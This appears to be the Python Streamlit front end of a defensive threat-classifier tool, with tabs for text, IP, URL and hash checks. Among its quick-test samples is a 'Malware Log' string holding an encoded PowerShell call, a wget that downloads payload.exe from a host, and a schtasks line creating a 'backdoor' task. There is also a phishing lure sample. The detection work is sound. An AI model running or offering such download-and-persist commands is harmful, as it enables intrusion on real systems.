"""
XYZ Company Cybersecurity Threat Classifier v3.0
"""

import streamlit as st
import time
from datetime import datetime
import json

from core import HybridThreatClassifier, IPChecker, URLAnalyzer, DomainChecker, FileAnalyzer
from utils import get_config, get_logger, InputValidator, ScanDatabase, ReportGenerator

import warnings
warnings.filterwarnings('ignore')

st.set_page_config(page_title="XYZ Company - AI Threat Classifier", page_icon="🛡️", layout="wide")

st.markdown("""
    <style>
    .main-header { text-align: center; padding: 20px; background: linear-gradient(90deg, #1a1a2e 0%, #16213e 100%); border-radius: 10px; margin-bottom: 20px; }
    .main-header h1 { color: #00d4ff; margin: 0; }
    .main-header h3 { color: #888; margin: 10px 0 0 0; }
    </style>
""", unsafe_allow_html=True)


@st.cache_resource
def load_classifier():
    config = get_config()
    classifier = HybridThreatClassifier(ml_weight=config.model.ml_weight, rule_weight=config.model.rule_weight)
    classifier.train()
    return classifier


@st.cache_resource
def load_analyzers():
    config = get_config()
    return {
        'ip_checker': IPChecker(abuseipdb_api_key=config.api_keys.abuseipdb),
        'url_analyzer': URLAnalyzer(),
        'domain_checker': DomainChecker(),
        'file_analyzer': FileAnalyzer(virustotal_api_key=config.api_keys.virustotal)
    }


@st.cache_resource
def load_database():
    return ScanDatabase()


classifier = load_classifier()
analyzers = load_analyzers()
database = load_database()
logger = get_logger()
config = get_config()

st.markdown("""
    <div class='main-header'>
        <h1>🛡️ XYZ Company Security Portal</h1>
        <h3>Hybrid AI + Rule-Based Threat Classification System v3.0</h3>
        <p style='color: #666; font-size: 14px;'>Created by <strong>Pranav Sarotra</strong></p>
    </div>
""", unsafe_allow_html=True)

with st.sidebar:
    st.markdown("### ⚙️ Model Configuration")
    ml_weight = st.slider("ML Model Weight", 0.0, 1.0, config.model.ml_weight, 0.1)
    classifier.ml_weight = ml_weight
    classifier.rule_weight = 1.0 - ml_weight
    st.caption(f"Rule Weight: {1.0 - ml_weight:.1f}")

    st.markdown("---")
    st.markdown("### 📈 Statistics")
    stats = database.get_statistics()
    st.metric("Total Scans", stats.get('total_scans', 0))
    st.metric("IP Checks", stats.get('total_ip_checks', 0))

tab1, tab2, tab3, tab4, tab5 = st.tabs(["📧 Text Analysis", "🌐 IP Checker", "🔗 URL Analyzer", "🏷️ Hash Lookup", "📜 History"])

with tab1:
    st.markdown("### 📧 Email/Log Content Analysis")

    samples = {
        "Phishing Email": "Dear Valued Customer, We have detected unusual activity. Your account will be SUSPENDED within 24 hours. Click here to verify: http://bit.ly/verify-now URGENT!",
        "Malware Log": "powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAA= cmd /c wget http://192.168.1.100/payload.exe schtasks /create /tn backdoor",
        "Safe Email": "Hi Team, Meeting reminder for tomorrow at 2 PM. Please review the attached agenda. Thanks, Sarah"
    }

    sample_option = st.selectbox("Quick Test:", ["-- Select --"] + list(samples.keys()))
    input_text = samples.get(sample_option, "") if sample_option != "-- Select --" else ""

    user_input = st.text_area("Paste content here:", value=input_text, height=200)

    if st.button("🔍 ANALYZE THREAT", type="primary", use_container_width=True):
        if user_input.strip():
            is_valid, sanitized, error = InputValidator.validate_text_input(user_input)
            if not is_valid:
                st.error(f"Invalid input: {error}")
            else:
                with st.spinner("Analyzing..."):
                    logger.scan_started("text", user_input[:50])
                    results = classifier.classify(sanitized)
                    logger.scan_completed(results.classification, results.confidence, results.threat_score)

                database.save_scan({
                    'input_text': user_input[:500], 'classification': results.classification,
                    'confidence': results.confidence, 'threat_score': results.threat_score,
                    'threat_level': results.threat_level, 'indicators': results.indicators,
                    'ml_scores': results.ml_scores, 'rule_scores': results.rule_scores,
                    'recommendations': results.recommendations
                })

                st.markdown("---")
                col1, col2, col3 = st.columns(3)
                with col1:
                    st.markdown(f"### {results.classification}")
                with col2:
                    st.metric("Confidence", f"{results.confidence}%")
                with col3:
                    st.metric("Threat Score", f"{results.threat_score}%")

                if results.indicators:
                    st.markdown("### 🔎 Detected Indicators")
                    for ind in results.indicators:
                        st.warning(ind)

                st.markdown("### 💡 Recommendations")
                for rec in results.recommendations:
                    st.info(rec)

                report = ReportGenerator.generate_text_report({
                    'classification': results.classification, 'confidence': results.confidence,
                    'threat_score': results.threat_score, 'threat_level': results.threat_level,
                    'indicators': results.indicators, 'recommendations': results.recommendations
                })
                st.download_button("📄 Download Report", report, file_name=f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        else:
            st.warning("Please enter text to analyze.")

with tab2:
    st.markdown("### 🌐 IP Address Checker")
    ip_input = st.text_input("Enter IP Address:", placeholder="e.g., 8.8.8.8")

    if st.button("🔍 Check IP", type="primary", key="check_ip"):
        if ip_input:
            is_valid, sanitized_ip, error = InputValidator.validate_ip_address(ip_input)
            if not is_valid:
                st.error(error)
            else:
                with st.spinner("Checking IP..."):
                    ip_info = analyzers['ip_checker'].check_ip(sanitized_ip)
                    summary = analyzers['ip_checker'].get_threat_summary(ip_info)

                database.save_ip_check({'ip': ip_info.ip, 'country': ip_info.country, 'threat_score': ip_info.threat_score, 'is_vpn': ip_info.is_vpn, 'is_proxy': ip_info.is_proxy})

                col1, col2 = st.columns(2)
                with col1:
                    st.metric("Threat Level", summary.get('threat_level'))
                    st.metric("Threat Score", f"{ip_info.threat_score}%")
                with col2:
                    st.write(f"**Country:** {ip_info.country}")
                    st.write(f"**ISP:** {ip_info.isp}")
                    st.write(f"**VPN:** {'Yes' if ip_info.is_vpn else 'No'}")
                    st.write(f"**Proxy:** {'Yes' if ip_info.is_proxy else 'No'}")

with tab3:
    st.markdown("### 🔗 URL Security Analysis")
    url_input = st.text_input("Enter URL:", placeholder="e.g., https://example.com")

    if st.button("🔍 Analyze URL", type="primary", key="analyze_url"):
        if url_input:
            is_valid, sanitized_url, error = InputValidator.validate_url(url_input)
            if not is_valid:
                st.error(error)
            else:
                with st.spinner("Analyzing URL..."):
                    url_info = analyzers['url_analyzer'].analyze(sanitized_url)

                database.save_url_check({'url': url_info.url, 'domain': url_info.domain, 'is_suspicious': url_info.is_suspicious, 'threat_score': url_info.threat_score})

                status = "⚠️ SUSPICIOUS" if url_info.is_suspicious else "✅ APPEARS SAFE"
                st.markdown(f"### {status}")
                st.metric("Threat Score", f"{url_info.threat_score}%")

                if url_info.indicators:
                    for ind in url_info.indicators:
                        st.warning(ind)

with tab4:
    st.markdown("### 🏷️ File Hash Lookup")
    hash_input = st.text_input("Enter Hash:", placeholder="MD5, SHA-1, or SHA-256")

    if st.button("🔍 Lookup Hash", type="primary", key="lookup_hash"):
        if hash_input:
            is_valid, sanitized, hash_type, error = InputValidator.validate_file_hash(hash_input)
            if not is_valid:
                st.error(error)
            else:
                with st.spinner("Looking up hash..."):
                    hash_info = analyzers['file_analyzer'].analyze_hash(sanitized)
                    summary = analyzers['file_analyzer'].get_threat_summary(hash_info)

                st.metric("Hash Type", hash_type)
                st.metric("Threat Level", summary.get('threat_level'))

                if hash_info.is_malware:
                    st.error(f"🦠 MALWARE DETECTED: {', '.join(hash_info.malware_names)}")
                else:
                    st.success("✅ No known malware detected")

with tab5:
    st.markdown("### 📜 Scan History")
    if st.button("🗑️ Clear History"):
        database.clear_history()
        st.success("History cleared!")
        st.rerun()

    scans = database.get_recent_scans(20)
    if scans:
        for scan in scans:
            st.markdown(f"**{scan['timestamp'][:19]}** - {scan['classification']} ({scan['confidence']}%)")
    else:
        st.info("No scan history yet.")

st.markdown("---")
st.markdown("<div style='text-align: center; color: #666;'><p>XYZ Company Security System v3.0 | Created by <strong>Pranav Sarotra</strong></p></div>", unsafe_allow_html=True)